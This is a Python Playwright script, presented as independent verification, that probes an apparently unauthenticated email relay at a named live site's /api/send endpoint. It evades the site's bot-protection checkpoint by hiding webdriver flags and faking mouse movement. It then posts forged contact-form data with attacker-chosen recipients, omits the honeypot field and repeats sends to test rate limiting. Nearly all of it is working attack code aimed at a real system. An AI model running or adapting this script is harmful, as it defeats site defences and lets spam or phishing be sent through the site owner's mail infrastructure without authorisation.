#!/usr/bin/env python3
"""
Independent verification: unauthenticated open email relay via POST https://www.infinitycapital.bh/api/send
Strategy:
  1. Launch real Chromium via Playwright, load the site so the Vercel BotID
     "Security Checkpoint" challenge executes and sets clearance cookies.
  2. From INSIDE the page origin (same-origin fetch => correct sec-fetch-*/origin/
     referer headers + clearance cookies), POST the exact FormData the site's own
     chunk 275 builds: fname, lname, areacode, tel, cname, subject, msg, check, targets.
  3. Compare recipient = the app's own default vs. attacker-chosen local-part.
"""
import json, sys, time
from playwright.sync_api import sync_playwright

BASE = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
TOKEN = sys.argv[1] if len(sys.argv) > 1 else "T1"

# Recipients used (no third-party spam; target's own domain + one invalid
# address to show the value is passed through verbatim to the mail provider).
DEFAULT_RECIP = "info@infinitycapital.bh"      # the app's own configured recipient
CUSTOM_RECIP  = f"relay-verify-{TOKEN}@infinitycapital.bh"  # attacker-chosen local-part
BOGUS_RECIP   = "not-an-email@invalid.invalid"  # proves verbatim pass-through to provider

def form_data(recv, check="0"):
    fd = []
    fd.append(("fname", "SecVerify"))
    fd.append(("lname", "Probe"))
    fd.append(("areacode", "+973"))
    fd.append(("tel", "1234567"))
    fd.append(("cname", f"RelayVerify{TOKEN}"))
    fd.append(("subject", f"security-verification {TOKEN}"))
    fd.append(("msg", f"Independent verifier probe {TOKEN}"))
    fd.append(("check", check))
    fd.append(("targets", recv))
    return fd

def post(page, recv, check="0"):
    return page.evaluate("""async ({fd, check}) => {
        const f = new FormData();
        for (const [k,v] of fd) f.set(k,v);
        const t0 = Date.now();
        const r = await fetch('/api/send', {method:'POST', body:f, credentials:'include'});
        const txt = await r.text();
        const h = {};
        for (const [k,v] of r.headers.entries()) h[k]=v;
        return {status:r.status, statusText:r.statusText, body:txt, headers:h,
                ms: Date.now()-t0};
    }""", {"fd": form_data(recv, check), "check": check})

def clear_check(page, recv):
    # omit the client honeypot entirely
    return page.evaluate("""async (recv) => {
        const f = new FormData();
        f.set('fname','SecVerify'); f.set('lname','Probe'); f.set('areacode','+973');
        f.set('tel','1234567'); f.set('cname','NoHoneypot');
        f.set('subject','security-verification'); f.set('msg','no check field');
        f.set('targets', recv);
        const r = await fetch('/api/send', {method:'POST', body:f, credentials:'include'});
        return {status:r.status, body: await r.text()};
    }""", recv)

out = {"base": BASE, "token": TOKEN, "steps": []}
with sync_playwright() as p:
    br = p.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-blink-features=AutomationControlled",
        "--disable-dev-shm-usage"])
    ctx = br.new_context(user_agent=UA, locale="en-US",
        viewport={"width": 1366, "height": 900})
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    page = ctx.new_page()
    captured = []
    page.on("response", lambda r: captured.append((r.status, r.url)))
    page.on("request", lambda r: captured.append(("REQ", r.url)))

    print("[*] loading site to clear Vercel challenge ...")
    page.goto(BASE + "/contact", wait_until="domcontentloaded", timeout=60000)
    # simulate human mouse so the BotID checkpoint's mouse probe succeeds
    for i in range(40):
        try:
            page.mouse.move(200 + i * 7, 300 + (i % 11) * 9)
            page.wait_for_timeout(120)
        except Exception:
            break
        if i > 6 and page.locator("form, article.contact, .contact").count() > 0:
            break
    page.wait_for_timeout(4000)
    title = page.title()
    body = page.content()
    print("[*] title:", title, "| len(html):", len(body))
    print("[*] still challenge? ", "Security Checkpoint" in title or "checkpoint" in body.lower()[:5000])
    out["challenge_solved"] = ("Security Checkpoint" not in title)
    out["cookies"] = [{"name": c["name"], "value": c["value"][:24] + ("..." if len(c["value"]) > 24 else "")}
                      for c in ctx.cookies()]
    print("[*] cookies:", [c["name"] for c in ctx.cookies()])

    results = {}
    print("[*] A) baseline: the app's OWN configured recipient")
    results["A_default_recipient"] = post(page, DEFAULT_RECIP)
    print("   ->", results["A_default_recipient"]["status"], results["A_default_recipient"]["body"][:300])

    print("[*] B) attacker-chosen recipient local-part")
    results["B_custom_recipient"] = post(page, CUSTOM_RECIP)
    print("   ->", results["B_custom_recipient"]["status"], results["B_custom_recipient"]["body"][:300])

    print("[*] C) attacker-chosen recipient, honeypot 'check' omitted entirely")
    results["C_no_honeypot"] = clear_check(page, f"relay-verify-nohp-{TOKEN}@infinitycapital.bh")
    print("   ->", results["C_no_honeypot"]["status"], results["C_no_honeypot"]["body"][:300])

    print("[*] D) invalid recipient -> shows verbatim pass-through of `targets` to mail provider")
    results["D_bogus_recipient"] = post(page, BOGUS_RECIP)
    print("   ->", results["D_bogus_recipient"]["status"], results["D_bogus_recipient"]["body"][:400])

    print("[*] E) repeat custom recipient (2nd send = no rate limit / no nonce)")
    results["E_custom_repeat"] = post(page, CUSTOM_RECIP)
    print("   ->", results["E_custom_repeat"]["status"], results["E_custom_repeat"]["body"][:300])

    out["results"] = results
    page.screenshot(path="/work/evidence/verify_contact_page.png", full_page=False)
    out["recent_network"] = [c for c in captured if c[0] in (200, 403) or (c[0] == "REQ" and "api" in c[1])][-25:]
    br.close()

with open("/work/evidence/verify_results.json", "w") as f:
    json.dump(out, f, indent=1)
print("\n=== saved /work/evidence/verify_results.json ===")
